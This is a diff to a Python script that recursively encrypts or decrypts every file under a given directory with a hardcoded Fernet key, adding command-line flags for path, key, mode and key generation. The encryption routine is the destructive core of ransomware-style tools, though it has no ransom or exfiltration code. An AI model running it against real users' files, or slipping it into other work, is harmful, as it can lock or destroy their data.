@@ -1,11 +1,18 @@
+#!/usr/bin/python
+
+import optparse
 import os
 from cryptography.fernet import Fernet
 
-class Recursive(object):
 
+class Recursive(object):
     """
-    Starting at a specified path, encrypting/decrypting all files contained in pwd then entering all
+    Starting at a specified path, encrypting or decrypting all files contained in pwd then entering all
     contained directories and repeating.
+    The same key is hardcoded for both encryption and decryrption but can be changed by using the -k or --key flag.
+    A new key can be generated and saved to a file using the --nky flag.
+    Path is passed in using the -p or --pth flag.
+    Encryption/decryption is specified using the --enc or --dec flags respectively, one and only one mnust be specified.
     ENSURE the correct path is entered.
     """
 
@@ -32,7 +39,6 @@ class Recursive(object):
                 dir_flag += 1
                 dirs.append(f)
         print(f"[*] Files : {files}")
-        # print(f"[*] Directories : {dirs}")
 
         for file in files:
             with open(file, "rb") as the_file:
@@ -46,7 +52,7 @@ class Recursive(object):
         if dir_flag > 0:
             for d in dirs:
                 p = f"{path}/{d}"
-                print(f"[!] path: {p}")
+                print(f"[+] path: {p}")
                 self.target_enc(p, k)
 
     def target_dec(self, path, k):
@@ -77,27 +83,53 @@ class Recursive(object):
         if dir_flag > 0:
             for d in dirs:
                 p = f"{path}/{d}"
-                print(f"[!] path: {p}")
+                print(f"[+] path: {p}")
                 self.target_dec(p, k)
 
 
 def main():
-    # Encryption tests  -->>  Comment out decrypt first, run encrypt then reverse
-
-    # To encrypt
     rec = Recursive()
 
-    # Line 91  -->>  to generate a new key and save to a file
-    t_k = Recursive.gen_key()
-    p = input("[*] Enter path: ")
-    rec.target_enc(p, t_k)
+    parser = optparse.OptionParser("Script to encrypt/decrypt all files in a target directory recursively")
+    parser.add_option('-p', '--pth', dest='pth', type='str', help='Directory starting point')
+    parser.add_option('-k', '--key', dest='key', type='str', help='Fernet key, not encoded')
+    parser.add_option('--enc', action='store_true', help='Option to encrypt')
+    parser.add_option('--dec', action='store_true', help='Option to decrypt')
+    parser.add_option('--nky', action='store_true', help='Output new key and save to file')
+    (options, args) = parser.parse_args()
 
-    # To decrypt
-    # with open("k.key", "rb") as k:
-    #     tk2 = k.read()
-    #
-    # p = input("[*] Enter path: ")
-    # rec.target_dec(p, tk2)
+    if options.nky:
+        print(f"New key: {rec.gen_key()}")
+        exit(0)
+
+    if options.pth is None:
+        print(f'{parser.usage}\nFor encryption enter absolute starting point directory to continue')
+        exit(0)
+    else:
+        p = options.pth
+
+    if options.key is None:
+        # uncomment line 113 to gen new key and save to file rather than using key at line 114
+        # t_k = Recursive.gen_key()
+        t_k = 'DKxZmlu4ExSeJUGfFRSMKUOl0QCpgGKM2cV_KAPt3_8='
+    else:
+        t_k = options.key
+
+    if options.enc and options.dec:
+        print("Enter only one encryption method at a time")
+        exit(0)
+
+    if not options.enc and not options.dec:
+        print("Enter an encryption method to continue")
+
+    t_k = t_k.encode()
+
+    if options.enc:
+        rec.target_enc(p, t_k)
+
+    if options.dec:
+        rec.target_dec(p, t_k)
+
 
 if __name__ == '__main__':
     main()
